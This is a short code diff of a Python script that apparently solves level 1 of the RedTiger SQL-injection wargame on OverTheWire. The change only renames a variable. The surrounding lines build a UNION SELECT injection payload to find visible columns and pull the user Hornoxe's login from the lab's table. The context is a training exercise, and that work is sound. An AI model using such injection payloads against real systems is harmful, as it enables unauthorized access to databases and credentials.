@@ -8,7 +8,7 @@ def main():
     Target: Get the login for the user Hornoxe 
     Tablename: level1_users 
     '''
-    base_name = 'level1_users'
+    table_name = 'level1_users'
     url = "https://redtiger.labs.overthewire.org/level1.php"
     finds = ['username', 'password']  # What we are finding
     pass_r = 'The password for the next level is: '
@@ -20,7 +20,7 @@ def main():
 
     # Search for visible columns
     payload = dict(
-        cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
+        cat=f"-1 union select {','.join(list_of_columns)} from {table_name}")
     # Data for compare
     p_base = dict(cat='-1')
     list_of_visible, html_visible = tg.find_visible_columns(url, len(list_of_columns),
